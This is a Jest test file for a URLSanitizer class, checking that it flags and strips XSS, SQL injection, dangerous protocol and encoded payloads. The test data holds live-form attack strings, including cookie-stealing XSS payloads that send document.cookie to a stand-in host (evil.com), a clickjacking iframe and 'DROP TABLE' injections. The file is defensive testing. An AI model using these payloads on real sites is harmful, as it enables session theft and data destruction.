import { URLSanitizer } from '../../src/theme/Root';

describe('URLSanitizer', () => {
  describe('isDangerous', () => {
    it('should identify dangerous script injection patterns', () => {
      const dangerousUrls = [
        '<script>alert("xss")</script>',
        '<script src="evil.js"></script>',
        'javascript:alert("xss")',
        'vbscript:alert("xss")',
        'data:text/html,<script>alert("xss")</script>',
        'onload=alert("xss")',
        'onclick=alert("xss")',
        'onmouseover=alert("xss")',
      ];

      dangerousUrls.forEach((url) => {
        expect(URLSanitizer.isDangerous(url)).toBe(true);
      });
    });

    it('should identify dangerous iframe and object injections', () => {
      const dangerousUrls = [
        '<iframe src="evil.com"></iframe>',
        '<object data="evil.swf"></object>',
        '<embed src="evil.swf">',
        '<applet code="Evil.class">',
      ];

      dangerousUrls.forEach((url) => {
        expect(URLSanitizer.isDangerous(url)).toBe(true);
      });
    });

    it('should identify dangerous meta refresh patterns', () => {
      const dangerousUrls = [
        '<meta http-equiv="refresh" content="0;url=javascript:alert()">',
        '<meta http-equiv="refresh" content="0;url=evil.com">',
      ];

      dangerousUrls.forEach((url) => {
        expect(URLSanitizer.isDangerous(url)).toBe(true);
      });
    });

    it('should identify dangerous style injections', () => {
      const dangerousUrls = [
        '<style>body{background:url(javascript:alert())}</style>',
        'expression(alert("xss"))',
        'data:text/script',
      ];

      dangerousUrls.forEach((url) => {
        expect(URLSanitizer.isDangerous(url)).toBe(true);
      });
    });

    it('should identify dangerous HTML entities', () => {
      const dangerousUrls = [
        '&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;',
        '&#x6a;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3a;',
        '&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A',
      ];

      dangerousUrls.forEach((url) => {
        expect(URLSanitizer.isDangerous(url)).toBe(true);
      });
    });

    it('should identify dangerous protocol handlers', () => {
      const dangerousUrls = [
        'chrome://settings/',
        'chrome-extension://malicious-id/',
        'moz-extension://malicious-id/',
        'feed://evil.com/rss',
      ];

      dangerousUrls.forEach((url) => {
        expect(URLSanitizer.isDangerous(url)).toBe(true);
      });
    });

    it('should identify SQL injection patterns', () => {
      const dangerousUrls = [
        "' UNION SELECT password FROM users--",
        'DROP TABLE users;',
        'DELETE FROM sensitive_data;',
        'union select * from admin',
      ];

      dangerousUrls.forEach((url) => {
        expect(URLSanitizer.isDangerous(url)).toBe(true);
      });
    });

    it('should not flag safe URLs as dangerous', () => {
      const safeUrls = [
        '/docs/intro',
        '/agents/config-management',
        'https://example.com/safe-page',
        '/search?q=nephio',
        '#safe-anchor',
        '?page=1&limit=10',
        '/zh-TW/docs/intro',
      ];

      safeUrls.forEach((url) => {
        expect(URLSanitizer.isDangerous(url)).toBe(false);
      });
    });

    it('should handle null and undefined inputs safely', () => {
      expect(URLSanitizer.isDangerous(null as any)).toBe(false);
      expect(URLSanitizer.isDangerous(undefined as any)).toBe(false);
      expect(URLSanitizer.isDangerous('')).toBe(false);
      expect(URLSanitizer.isDangerous(123 as any)).toBe(false);
    });

    it('should handle URL-encoded dangerous patterns', () => {
      const encodedDangerousUrls = [
        encodeURIComponent('<script>alert("xss")</script>'),
        encodeURIComponent('javascript:alert("xss")'),
        '%3Cscript%3Ealert(%22xss%22)%3C/script%3E',
        '%6A%61%76%61%73%63%72%69%70%74%3A%61%6C%65%72%74%28%29',
      ];

      encodedDangerousUrls.forEach((url) => {
        expect(URLSanitizer.isDangerous(url)).toBe(true);
      });
    });
  });

  describe('sanitize', () => {
    it('should remove script tags', () => {
      const malicious = '<script>alert("xss")</script>Hello World';
      const sanitized = URLSanitizer.sanitize(malicious);
      
      expect(sanitized).toContain('[REMOVED]');
      expect(sanitized).toContain('Hello World');
      expect(sanitized).not.toContain('<script>');
    });

    it('should remove javascript: URLs', () => {
      const malicious = 'javascript:alert("xss")';
      const sanitized = URLSanitizer.sanitize(malicious);
      
      expect(sanitized).toContain('[REMOVED]');
      expect(sanitized).not.toContain('javascript:');
    });

    it('should remove event handlers', () => {
      const malicious = 'onload=alert("xss") onclick=evil()';
      const sanitized = URLSanitizer.sanitize(malicious);
      
      expect(sanitized).toContain('[REMOVED]');
      expect(sanitized).not.toContain('onload');
      expect(sanitized).not.toContain('onclick');
    });

    it('should escape HTML characters', () => {
      const malicious = 'Hello & "World" <test>';
      const sanitized = URLSanitizer.sanitize(malicious);
      
      expect(sanitized).toBe('Hello &amp; &quot;World&quot; test');
      expect(sanitized).not.toContain('<');
      expect(sanitized).not.toContain('>');
      expect(sanitized).toContain('&amp;');
      expect(sanitized).toContain('&quot;');
    });

    it('should escape single quotes', () => {
      const malicious = "Hello 'World'";
      const sanitized = URLSanitizer.sanitize(malicious);
      
      expect(sanitized).toBe('Hello &#x27;World&#x27;');
      expect(sanitized).not.toContain("'");
    });

    it('should handle multiple dangerous patterns', () => {
      const malicious = '<script>alert("xss")</script><iframe src="evil.com"></iframe>javascript:evil()';
      const sanitized = URLSanitizer.sanitize(malicious);
      
      expect(sanitized).toContain('[REMOVED]');
      expect(sanitized).not.toContain('<script>');
      expect(sanitized).not.toContain('<iframe');
      expect(sanitized).not.toContain('javascript:');
    });

    it('should handle null and undefined inputs', () => {
      expect(URLSanitizer.sanitize(null as any)).toBe('');
      expect(URLSanitizer.sanitize(undefined as any)).toBe('');
      expect(URLSanitizer.sanitize('')).toBe('');
    });

    it('should preserve safe content', () => {
      const safe = 'Hello World - This is safe content!';
      const sanitized = URLSanitizer.sanitize(safe);
      
      expect(sanitized).toBe('Hello World - This is safe content!');
    });

    it('should handle complex mixed content', () => {
      const complex = 'Safe text <script>alert("xss")</script> more safe & "quoted" text';
      const sanitized = URLSanitizer.sanitize(complex);
      
      expect(sanitized).toBe('Safe text [REMOVED] more safe &amp; &quot;quoted&quot; text');
    });
  });

  describe('createSafe404Path', () => {
    it('should return a safe 404 path', () => {
      const safe404 = URLSanitizer.createSafe404Path();
      
      expect(safe404).toBe('/404?error=malformed_url');
      expect(URLSanitizer.isDangerous(safe404)).toBe(false);
    });
  });

  describe('edge cases and performance', () => {
    it('should handle very long strings without crashing', () => {
      const longString = 'a'.repeat(10000) + '<script>alert("xss")</script>' + 'b'.repeat(10000);
      
      expect(() => {
        const result = URLSanitizer.isDangerous(longString);
        expect(result).toBe(true);
      }).not.toThrow();
      
      expect(() => {
        const sanitized = URLSanitizer.sanitize(longString);
        expect(sanitized).toContain('[REMOVED]');
      }).not.toThrow();
    });

    it('should handle strings with special regex characters', () => {
      const specialChars = 'Hello $()*+?[\\]^{|}';
      
      expect(() => {
        const result = URLSanitizer.isDangerous(specialChars);
        expect(result).toBe(false);
      }).not.toThrow();
      
      expect(() => {
        const sanitized = URLSanitizer.sanitize(specialChars);
        expect(sanitized).toBe('Hello $()*+?[\\]^{|}');
      }).not.toThrow();
    });

    it('should handle malformed URI encoding gracefully', () => {
      const malformedURI = '%GG%invalid%encoding%';
      
      expect(() => {
        const result = URLSanitizer.isDangerous(malformedURI);
        expect(typeof result).toBe('boolean');
      }).not.toThrow();
    });

    it('should be case insensitive for dangerous patterns', () => {
      const caseVariations = [
        'JAVASCRIPT:alert()',
        'JavaScript:Alert()',
        '<SCRIPT>alert()</SCRIPT>',
        '<Script>Alert()</Script>',
        'ONLOAD=alert()',
        'OnLoad=Alert()',
      ];

      caseVariations.forEach((url) => {
        expect(URLSanitizer.isDangerous(url)).toBe(true);
      });
    });
  });

  describe('real-world attack scenarios', () => {
    it('should prevent DOM-based XSS via hash', () => {
      const xssHashes = [
        '#<script>document.location="http://evil.com/steal.php?cookie="+document.cookie</script>',
        '#javascript:document.location="http://evil.com/steal.php?cookie="+document.cookie',
        '#<img src=x onerror=document.location="http://evil.com/steal.php?cookie="+document.cookie>',
      ];

      xssHashes.forEach((hash) => {
        expect(URLSanitizer.isDangerous(hash)).toBe(true);
      });
    });

    it('should prevent reflected XSS via URL parameters', () => {
      const xssParams = [
        '?search=<script>alert("reflected-xss")</script>',
        '?name="><script>alert(document.cookie)</script>',
        '?redirect=javascript:alert("xss")',
      ];

      xssParams.forEach((param) => {
        expect(URLSanitizer.isDangerous(param)).toBe(true);
      });
    });

    it('should prevent clickjacking attempts', () => {
      const clickjackingAttempts = [
        '<iframe src="http://legitimate-bank.com/login" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>',
        '<object data="http://evil.com/clickjack.swf"></object>',
      ];

      clickjackingAttempts.forEach((attempt) => {
        expect(URLSanitizer.isDangerous(attempt)).toBe(true);
      });
    });

    it('should prevent CSS injection attacks', () => {
      const cssInjections = [
        'background:url(javascript:alert("CSS-XSS"))',
        'expression(alert("IE-CSS-XSS"))',
        '<style>@import"javascript:alert()";</style>',
      ];

      cssInjections.forEach((injection) => {
        expect(URLSanitizer.isDangerous(injection)).toBe(true);
      });
    });
  });
});